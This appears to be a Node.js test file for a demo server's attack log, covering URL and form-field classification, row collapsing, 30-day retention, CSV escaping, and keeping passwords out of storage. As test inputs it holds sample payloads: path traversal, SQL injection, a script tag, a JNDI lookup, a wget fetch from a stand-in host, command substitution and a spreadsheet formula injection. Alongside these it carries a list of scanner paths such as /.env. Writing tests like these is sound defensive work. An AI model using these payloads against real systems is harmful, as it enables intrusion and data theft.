'use strict';

// The demo's attack log: what counts as an attack, collapsing, the cap, the
// 30 days, CSV escaping, and that nothing secret is kept.

const test = require('node:test');
const assert = require('node:assert/strict');
const { ManagerDB } = require('../server/db');
const { createAttackLog, classifyUrl, classifyFields, csvCell, clip } = require('../server/attackLog');

const req = (ip, url = '/', ua = 'curl/8') => ({ url, method: 'GET', socket: { remoteAddress: ip }, headers: { 'user-agent': ua } });

test('scanner paths and exploit patterns; ordinary app paths are not', () => {
  for (const u of ['/wp-admin/', '/wp-login.php', '/.env', '/.git/config', '/phpmyadmin/index.php', '/cgi-bin/luci', '/boaform/admin/formLogin',
    '/HNAP1/', '/actuator/health', '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', '/server-status', '/index.php', '/admin/config.php']) {
    assert.equal(classifyUrl(u)?.kind, 'scan', u);
  }
  const exploits = { '/a/../../etc/passwd': 'traversal', '/x?f=%2e%2e%2fetc': 'traversal', '/?q=<script>alert(1)</script>': 'script',
    "/?id=1' OR '1'='1": 'sql', '/?id=1+union+select+1,2': 'sql', '/?x=${jndi:ldap://e/a}': 'jndi', '/?c=;wget+http://e/x.sh': 'shell',
    '/?c=$(id)': 'shell', '/file%00.png': 'null byte', '/wp-login.php?x=${jndi:x}': 'jndi' };
  for (const [u, what] of Object.entries(exploits)) {
    const hit = classifyUrl(u);
    assert.equal(hit?.kind, 'exploit', u);
    assert.match(hit.detail, new RegExp(`^${what}`), u);
  }
  for (const u of ['/', '/login', '/web/app.js', '/api/vehicles?limit=10&id=5', '/studio/index.html', '/api/search?q=parking lot', '/v/abc/web/shell.css',
    '/api/media?path=/footage/TeslaCam/SavedClips/2026-01-01_10-00-00/front.mp4', '/.well-known/acme-challenge/abc', '/assets/icon.png', '/owner']) {
    assert.equal(classifyUrl(u), null, u);
  }
  // form fields: patterns count, secret fields are never looked at
  assert.equal(classifyFields({ username: "admin' OR '1'='1" })?.kind, 'exploit');
  assert.equal(classifyFields({ username: 'demo', password: "' OR '1'='1" }), null);
  assert.equal(classifyFields({ settings: { name: '<script>x</script>' } })?.kind, 'exploit');
  assert.equal(classifyFields({ name: 'Daily Driver', note: 'parked at home' }), null);
});

test('repeats collapse to one row per address and kind; samples are clipped and escaped; no password is stored', () => {
  const db = new ManagerDB(':memory:');
  let t = 1_000_000;
  const log = createAttackLog({ db, now: () => t });
  for (let i = 0; i < 5; i++) { t += 1000; log.note('scan', req('203.0.113.9', `/wp-admin/${i}`), `/wp-admin/${i}`); }
  log.note('login', req('203.0.113.9'), 'root');
  t += 1000;
  log.note('login', req('::ffff:198.51.100.7', '/', 'x'.repeat(500)), 'evil‮\u0000name' + 'y'.repeat(400));
  const groups = log.list();
  assert.equal(groups.length, 2);
  const a = groups.find((g) => g.address === '203.0.113.9');
  assert.equal(a.count, 6);
  assert.deepEqual(a.kinds, { scan: 5, login: 1 });
  const scan = a.entries.find((e) => e.kind === 'scan');
  assert.deepEqual([scan.count, scan.firstSeen, scan.lastSeen, scan.sample, scan.agent], [5, 1_001_000, 1_005_000, '/wp-admin/4', 'curl/8']);
  const b = groups.find((g) => g.address === '198.51.100.7');
  assert.ok(b.entries[0].sample.length <= 160 && b.entries[0].agent.length <= 200);
  assert.doesNotMatch(b.entries[0].sample, /[‮\u0000]/);
  assert.match(b.entries[0].sample, /\\u\{202e\}/);
  // filters and order
  assert.equal(log.list({ kind: 'scan' }).length, 1);
  assert.equal(log.list({ sort: 'active' })[0].address, '203.0.113.9');
  assert.equal(log.list({ sort: 'newest' })[0].address, '198.51.100.7');
  // a whole sign-in with a form: only the user name, never the password
  log.inspectFields(req('192.0.2.1'), { username: "x' or 1=1 --", password: 'hunter2-secret' });
  assert.doesNotMatch(JSON.stringify(log.list()) + log.csv(), /hunter2/);
  assert.equal(clip('a'.repeat(10), 5), 'aaaa…');
});

test('at most maxRows rows (the oldest go) and nothing older than 30 days', () => {
  const db = new ManagerDB(':memory:');
  let t = Date.UTC(2026, 0, 1);
  const log = createAttackLog({ db, now: () => t, maxRows: 50 });
  for (let i = 0; i < 80; i++) { t += 1000; log.note('scan', req(`203.0.113.${i}`), '/x.php'); }
  log.prune();
  const left = log.list({ limit: 1000 });
  assert.equal(left.length, 50);
  assert.ok(!left.some((g) => g.address === '203.0.113.0'), 'the oldest went');
  assert.ok(left.some((g) => g.address === '203.0.113.79'));
  t += 31 * 86400_000;
  log.note('login', req('198.51.100.1'), 'admin');
  assert.deepEqual(log.list().map((g) => g.address), ['198.51.100.1']);
  assert.equal(log.stats().rows, 1);
});

test('CSV: every cell quoted, formulas defused', () => {
  assert.equal(csvCell('=HYPERLINK("http://e")'), `"'=HYPERLINK(""http://e"")"`);
  for (const s of ['+1', '-2', '@SUM(A1)', '\tx', '\rx', '|x', '%x']) assert.equal(csvCell(s)[1], "'", s);
  assert.equal(csvCell('plain'), '"plain"');
  const db = new ManagerDB(':memory:');
  const log = createAttackLog({ db });
  log.note('login', req('203.0.113.9', '/', '=cmd|calc'), '=1+2');
  const text = log.csv();
  assert.match(text, /^address,kind,count,first_seen,last_seen,sample,user_agent\r\n/);
  assert.match(text, /"'=1\+2","'=cmd\|calc"\r\n$/);
});

test('visitors today: distinct addresses, starting again the next day', () => {
  let t = Date.UTC(2026, 5, 1, 12);
  const log = createAttackLog({ db: new ManagerDB(':memory:'), now: () => t });
  for (const ip of ['203.0.113.1', '203.0.113.1', '203.0.113.2']) log.seen(req(ip));
  assert.equal(log.stats().visitorsToday, 2);
  t += 86400_000;
  assert.equal(log.stats().visitorsToday, 0);
});
